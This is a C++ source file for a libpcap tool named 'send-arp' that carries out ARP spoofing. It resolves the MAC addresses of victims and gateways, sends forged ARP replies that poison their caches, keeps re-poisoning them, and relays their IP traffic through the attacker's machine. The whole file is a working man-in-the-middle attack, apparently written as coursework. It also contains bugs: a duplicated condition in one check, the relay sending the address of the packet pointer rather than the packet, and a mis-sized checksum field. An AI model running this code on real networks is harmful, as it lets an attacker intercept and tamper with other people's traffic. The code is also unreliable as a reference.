#include "functions.h"

/// MAC 주소 길이
#define MAC_ALEN 6
#define IP_ALEN 4

#define MAC_ADDR_FMT "%02X:%02X:%02X:%02X:%02X:%02X" 
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

int cnt=0;

AddrInfo getMyIPMacAddr(char *ifname)
{
	struct ifreq ifr;
	int sockfd, ret;
	
	uint8_t mac_addr[6];
	AddrInfo returnAddrInfo;

	// Open Socket
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0) {
		fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
		exit(-1);
	}

	// Check the MAC address of Network Interface
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if (ret < 0) {
		fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sockfd);
		exit(-1);
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
	returnAddrInfo._mac = Mac(mac_addr);

	// Check the IP address of Network Interface
	ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
	if (ret < 0) {
		fprintf(stderr, "Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
		close(sockfd);
		exit(-1);
	}
	struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
	returnAddrInfo._ip = Ip(inet_ntoa(sin->sin_addr));
	close(sockfd);

	return returnAddrInfo;
}

//////////////
struct EthernetHeader{
    uint8_t destinationMAC[6];
    uint8_t sourceMAC[6];
    uint16_t type;
};

struct IPHeader{
    uint8_t headerLength : 4;
    uint8_t version : 4;
    uint8_t typeOfService;
    uint16_t totalPacketLength;
    uint16_t identifier;
    uint16_t fragmentOffset;
    uint8_t ttl;
    uint8_t protocolID;
    uint8_t headerChecksum;
    struct in_addr sourceIP;
    struct in_addr destinationIP;
};


//////////////


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getSMac(Mac smac, Mac dmac, Ip sip, Mac tmac, Ip tip, pcap_t *handle) {
	Mac replySmac;

	EthArpPacket arpPacket = useARPPacket(smac, dmac, sip, tmac, tip, ArpHdr::Request);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res2 = pcap_next_ex(handle, &header, &packet);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
			exit(-1);
		}

		// ARP check
		EthHdr *_ethHdr = (EthHdr*)packet;

		bool isArpPacket = _ethHdr->type_ == ntohs(0x0806);
		if(!isArpPacket) continue;

		EthArpPacket *_ethArpPacket = (EthArpPacket*)packet;

		// Reply check
		bool isReplyPacket = _ethArpPacket->arp_.op_ == htons(ArpHdr::Reply);
		if(!isReplyPacket) continue;

		// dmac & sip check
		bool isSameDmac = _ethArpPacket->eth_.dmac_ == (smac);
		bool isSameSip = ntohl(_ethArpPacket->arp_.sip_) == htonl(tip);
		if(!isSameDmac || !isSameDmac) continue;

		EthernetHeader *_smacCheck = (EthernetHeader *)packet;

		in_addr temp;
		temp.s_addr = (_ethArpPacket->arp_.sip_);
		return _ethArpPacket->eth_.smac_;
	}
}

EthArpPacket useARPPacket(Mac smac, Mac dmac, Ip sip, Mac tmac, Ip tip, uint16_t op) {
	EthArpPacket packet;

	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	return packet;
}


AddrInfoPair makeInitAddrInfo() {
	AddrInfoPair _pair;

	_pair._sender._ip = Ip("0.0.0.0");
	_pair._target._ip = Ip("0.0.0.0");
	_pair._sender._mac = Mac("00:00:00:00:00:00");
	_pair._target._mac = Mac("00:00:00:00:00:00");

	return _pair;
}

AddrInfoPair checkReceivedPacket(const u_char* packet, AddrInfo AttackerInfo, std::vector<AddrInfoPair>& SenderTargetList, int flag = 0) {

	// 미리 변수 선언 ()
	int isValidDmac = 0;
	int isValidSmac = 0;
	int isValidTip  = 0;
	int isValidSip  = 0;

	// 리턴 전용 Pair 초기화
	AddrInfoPair returnPair = makeInitAddrInfo();

	// 여기서 Packet 분석. => IP와 MAC 전부 조사.	
	EthArpPacket * receivedPacket = (EthArpPacket *)packet;
	EthernetHeader *receivedEthHdr = (EthernetHeader *)packet;
	IPHeader *receivedIPHdr = (IPHeader *)(packet + ETHERNET_HEADER_SIZE);

	// 여기서 vector 내 검색. 
	for(auto &addr : SenderTargetList) {
		// Relay의 경우
		if(flag) {
			isValidDmac = receivedPacket->eth_.dmac_ == AttackerInfo._mac ? 1 : 0;
			isValidTip  = Ip(ntohl(receivedIPHdr->destinationIP.s_addr))  == addr._target._ip ? 1 : 0;
			isValidSip  = Ip(ntohl(receivedIPHdr->sourceIP.s_addr))  == addr._sender._ip ? 1 : 0;

			in_addr temp;
			if(!isValidDmac || !isValidTip || !isValidSip) continue;

			if(isValidDmac && isValidSip && isValidTip) {
				return addr;
			}
			continue;
		}

		// Reply의 경우
		isValidDmac = receivedPacket->eth_.dmac_ == AttackerInfo._mac 
				   || receivedPacket->eth_.dmac_ == Mac("FF:FF:FF:FF:FF:FF")? 1 : 0;
		isValidSmac = receivedPacket->eth_.smac_ == addr._sender._mac ? 1 : 0;
		isValidTip = Ip(ntohl(receivedPacket->arp_.tip_)) == addr._target._ip ? 1 : 0;
		
		if(isValidDmac && isValidSmac && isValidTip) {
			return addr;
		}
	}

	return returnPair;
}

Mac findTargetMac(Mac senderMac, std::vector<AddrInfoPair>& SenderTargetList) {
	Mac returnMac = Mac("00:00:00:00:00:00");

	for(auto &addr : SenderTargetList) 
		if(senderMac == addr._sender._mac)
			return addr._target._mac;
	
	return returnMac;
}

// Ip 가 0.0.0.0 인지 아닌지에 대해 1 : 0으로 리턴
int isValidAddrInfoPair(AddrInfoPair replyNeededPair) {
	return replyNeededPair._sender._ip == Ip("0.0.0.0") && replyNeededPair._target._ip == Ip("0.0.0.0") ? 0 : 1;
}

int isArpPacket(const u_char* packet) {
	return ((EthHdr*)packet)->type_ == ntohs(0x0806) ? 1 : 0;
}

void relayReceivedPacket(const u_char* packet, u_long size, AddrInfo AttackerInfo, AddrInfoPair relayNeededPair, pcap_t *handle) {

	EthHdr *relayEthHdr = (EthHdr *)packet;

	// Mac 정보 수정.
	relayEthHdr->smac_ = AttackerInfo._mac;
	relayEthHdr->dmac_ = relayNeededPair._target._mac;

	EthernetHeader * _tempEth = (EthernetHeader *)packet;
	
	if(ntohs(_tempEth->type) != 0x0800) {
		return;
	}

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		fprintf(stderr, "Size : %lu\n", size);
		exit(-1);
	}
}

void replyARPPacket(AddrInfo AttackerInfo, AddrInfoPair SenderTargetInfo, pcap_t *handle) {
	EthArpPacket spoofingPacket = useARPPacket( AttackerInfo._mac, 
												SenderTargetInfo._sender._mac, 
												SenderTargetInfo._target._ip, 
												SenderTargetInfo._sender._mac, 
												SenderTargetInfo._sender._ip, 
												ArpHdr::Reply );

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofingPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}
}

void replyOrRelay(AddrInfo AttackerInfo, std::vector<AddrInfoPair>& SenderTargetList, pcap_t *handle) {

	// 일단 한번씩 모두 보낸다. (Init)
	for(auto &addr : SenderTargetList) {
		EthArpPacket spoofingPacket = useARPPacket( AttackerInfo._mac, 
													addr._sender._mac, 
													addr._target._ip, 
													addr._sender._mac, 
													addr._sender._ip, 
													ArpHdr::Reply );
	
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofingPacket), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			exit(-1);
		}
	}

	// 이후부터는 지속적으로 감염시키면서, Relay를 해야한다.

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;

		// Catch one packet
		int res2 = pcap_next_ex(handle, &header, &packet);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
			exit(-1);
		}

		// ARP check
		if(!isArpPacket(packet)) {
			AddrInfoPair relayNeededPair = checkReceivedPacket(packet, AttackerInfo, SenderTargetList, FOR_RELAY);
			if(isValidAddrInfoPair(relayNeededPair)){
				printf("valid :: Relay packet\n");
				relayReceivedPacket(packet, header->caplen, AttackerInfo, relayNeededPair, handle);
			}

			continue;
		}
		
		AddrInfoPair replyNeededPair = checkReceivedPacket(packet, AttackerInfo, SenderTargetList, FOR_REPLY);
		if(isValidAddrInfoPair(replyNeededPair)) {
			printf("valid :: Reply packet\n");
			replyARPPacket(AttackerInfo, replyNeededPair, handle);
		}
	}

}

void arpSpoofing(int len, char** argv, char *dev, pcap_t *handle) {
	// Attacker의 MAC주소와 IP주소를 가져오기
	AddrInfo AttackerInfo = getMyIPMacAddr(dev);


	// // 모든 Sender & Target IP 등록
	std::vector<AddrInfoPair> flowList;
	for(int i = 2; i < len; i += 2){
		AddrInfoPair flow;

		char *SIP = argv[i];
		char *TIP = argv[i + 1];

		flow._sender._ip = Ip(SIP);
		flow._target._ip = Ip(TIP);
		flow._sender._mac = Mac("00:00:00:00:00:00");
		flow._target._mac = Mac("00:00:00:00:00:00");

		flowList.push_back(flow);
	}

	// 모든 Sender & Target Mac 등록
	for(auto &addr : flowList) {
		Mac dmac = Mac("FF:FF:FF:FF:FF:FF");
		Mac smac = Mac("00:00:00:00:00:00");

		addr._sender._mac = getSMac(AttackerInfo._mac, dmac, AttackerInfo._ip, smac, addr._sender._ip, handle);
		addr._target._mac = getSMac(AttackerInfo._mac, dmac, AttackerInfo._ip, smac, addr._target._ip, handle);
	}

	// ARP spoofing진행 + Relay
	replyOrRelay(AttackerInfo, flowList, handle);
}